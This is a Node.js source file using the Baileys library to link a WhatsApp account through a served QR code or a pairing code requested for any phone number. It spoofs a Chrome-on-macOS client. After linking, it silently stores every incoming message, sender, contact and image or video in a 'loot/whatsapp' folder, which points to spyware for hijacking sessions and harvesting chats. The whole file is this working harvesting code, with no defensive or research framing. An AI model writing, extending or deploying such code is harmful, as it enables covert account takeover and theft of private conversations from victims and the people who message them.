const {
  makeWASocket, useMultiFileAuthState, DisconnectReason,
  fetchLatestBaileysVersion, makeCacheableSignalKeyStore
} = require('@whiskeysockets/baileys');
const express = require('express');
const fs = require('fs');
const path = require('path');
const pino = require('pino');

const AUTH = path.join(__dirname, 'wa-auth');
const QR = path.join(__dirname, 'static', 'wa-qr.txt');
const PAIR = path.join(__dirname, 'static', 'wa-pair-code.txt');
const LOOT = path.join(__dirname, 'loot', 'whatsapp');
const PORT = process.env.WA_PORT || 8554;

fs.mkdirSync(AUTH, { recursive: true });
fs.mkdirSync(path.dirname(QR), { recursive: true });
fs.mkdirSync(LOOT, { recursive: true });

try { fs.unlinkSync(QR); } catch(e) {}
try { fs.unlinkSync(PAIR); } catch(e) {}

let sock = null;
let state = 'connecting';
let pairCode = null;

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/status', (req, res) => {
  res.json({
    connected: state === 'open',
    state: state,
    phone: sock && sock.user ? String(sock.user.id || '').split(':')[0] : null,
    name: sock && sock.user ? sock.user.name : null,
    pair_code: pairCode
  });
});

app.get('/api/whatsapp-status', (req, res) => {
  res.json({
    connected: state === 'open',
    pair_code: pairCode,
    phone: sock && sock.user ? String(sock.user.id || '').split(':')[0] : null
  });
});

app.post('/api/whatsapp-pair', async (req, res) => {
  const phone = String((req.body && (req.body.phone || req.body.number)) || req.query.phone || '').replace(/\D/g, '');
  if (!phone || phone.length < 10 || phone.length > 13) {
    return res.status(400).json({ ok: false, error: 'número inválido (DDD + número, só dígitos)' });
  }
  if (state !== 'open' || !sock) {
    return res.status(409).json({ ok: false, error: 'bot não está conectado' });
  }
  try {
    const code = await sock.requestPairingCode(phone);
    pairCode = code;
    fs.writeFileSync(PAIR, code);
    console.log('[WA] Pair code', code, 'para', phone);
    res.json({ ok: true, code: code });
  } catch (e) {
    console.error('[WA] requestPairingCode falhou:', e.message);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.get('/whatsapp-pair', (req, res) => {
  res.sendFile(path.join(__dirname, 'templates-whatsapp-pair.html'));
});

app.get('/whatsapp', async (req, res) => {
  try {
    if (state === 'open') {
      const me = sock && sock.user ? (sock.user.name || String(sock.user.id || '').split(':')[0]) : '?';
      return res.send('<html><body style="background:#111b21;display:flex;align-items:center;justify-content:center;height:100vh;margin:0"><div style="text-align:center;color:#e9edef;font-family:sans-serif"><p style="font-size:40px;margin:0">✅</p><p>Conectado como <b>' + me + '</b></p></div></body></html>');
    }
    const qr = fs.readFileSync(QR, 'utf8');
    const QRCode = require('qrcode');
    const url = await QRCode.toDataURL(qr, { width: 260, margin: 1 });
    res.send('<html><body style="background:#111b21;display:flex;align-items:center;justify-content:center;height:100vh;margin:0"><div style="text-align:center"><img src="' + url + '" style="border-radius:8px"><p style="color:#e9edef;font-family:sans-serif;font-size:13px">Escaneie com o WhatsApp → ⋮ → Aparelhos conectados</p></div></body></html>');
  } catch (e) {
    res.status(500).send('QR indisponível: ' + e.message);
  }
});

app.listen(PORT, () => console.log('[WA] Pair API em http://127.0.0.1:' + PORT));

async function start() {
  const { state: st, saveCreds } = await useMultiFileAuthState(AUTH);
  const { version, isLatest } = await fetchLatestBaileysVersion();
  console.log('[WA] Protocolo v' + version.join('.') + ' | Latest:', isLatest);

  sock = makeWASocket({
    version: version,
    auth: {
      creds: st.creds,
      keys: makeCacheableSignalKeyStore(st.keys, pino({ level: 'silent' }))
    },
    printQRInTerminal: false,
    browser: ['Chrome (MacOS)', 'Chrome', '121.0.0'],
    logger: pino({ level: 'silent' }),
    syncFullHistory: false,
    connectTimeoutMs: 60000,
    qrTimeout: 45000,
  });

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr) {
      state = 'qr';
      fs.writeFileSync(QR, qr);
      console.log('[WA] QR code gerado — escaneie agora');
    }

    if (connection === 'open') {
      state = 'open';
      console.log('[WA] CONECTADO ✅');
      fs.writeFileSync(QR, 'Conectado!');
      const me = sock.user;
      console.log('[WA] Nome:', me && me.name || '?', '| Número:', me && me.id ? String(me.id).split(':')[0] : '?');
    }

    if (connection === 'close') {
      const code = lastDisconnect && lastDisconnect.error && lastDisconnect.error.output ? lastDisconnect.error.output.statusCode : undefined;
      state = 'closed';
      console.log('[WA] Desconectado. Código:', code);
      try { fs.unlinkSync(QR); } catch(e) {}
      try { fs.unlinkSync(PAIR); } catch(e) {}

      if (code === DisconnectReason.loggedOut) {
        console.log('[WA] Sessão revogada. Apague wa-auth/ e tente novamente.');
        return;
      }

      const delay = code === 405 ? 30000 : 5000;
      console.log('[WA] Reconectando em', delay / 1000, 's...');
      setTimeout(start, delay);
    }
  });

  sock.ev.on('messages.upsert', async (msg) => {
    for (const m of msg.messages) {
      if (m.key.fromMe) continue;
      const chatId = String(m.key.remoteJid || '');
      const chatDir = path.join(LOOT, chatId.replace(/[@.:]/g, '_'));
      fs.mkdirSync(chatDir, { recursive: true });

      const sender = m.pushName || String(m.key.participant || chatId);
      const text = m.message && (m.message.conversation ||
                   m.message.extendedTextMessage && m.message.extendedTextMessage.text ||
                   m.message.imageMessage && m.message.imageMessage.caption) || '';

      fs.writeFileSync(path.join(chatDir, 'msg_' + m.key.id + '.json'), JSON.stringify({
        id: m.key.id, from: sender, chat: chatId, text: text,
        ts: new Date().toISOString()
      }));

      const idxPath = path.join(LOOT, 'contacts.json');
      let idx = {};
      try { idx = JSON.parse(fs.readFileSync(idxPath, 'utf8')); } catch(e) {}
      idx[chatId] = sender;
      fs.writeFileSync(idxPath, JSON.stringify(idx, null, 1));

      if (m.message && (m.message.imageMessage || m.message.videoMessage)) {
        try {
          const buf = await sock.downloadMediaMessage(m);
          if (buf) fs.writeFileSync(path.join(chatDir, 'media_' + m.key.id + '.' + (m.message.imageMessage ? 'jpg' : 'mp4')), buf);
        } catch(e) {}
      }

      console.log('[' + sender.substring(0, 12) + ']', text.substring(0, 50));
    }
  });

  sock.ev.on('creds.update', saveCreds);
}

start().catch(e => {
  console.error('[WA] Erro:', e.message);
  setTimeout(start, 10000);
});
